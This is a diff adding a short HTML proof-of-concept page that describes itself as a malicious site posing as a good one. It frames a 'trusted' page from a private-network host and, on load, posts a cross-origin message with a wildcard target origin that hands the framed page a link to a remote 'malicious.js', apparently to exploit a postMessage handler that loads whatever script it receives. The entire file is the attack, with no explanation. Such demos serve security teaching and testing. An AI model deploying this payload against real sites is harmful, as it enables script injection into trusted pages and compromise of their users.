@@ -1,0 +1,11 @@
+<body>
+  <h1>I am a Malicious Site That Pretend to be a good site.</h1>
+
+  <iframe src="http://172.19.45.112:3000/trustedSite.html" frameborder="0"></iframe>
+</body>
+
+<script>
+  window.addEventListener("load", e => {
+    window.frames[0].postMessage({link: "http://172.19.45.112:8001/static/malicious.js"}, "*")
+  })
+</script>
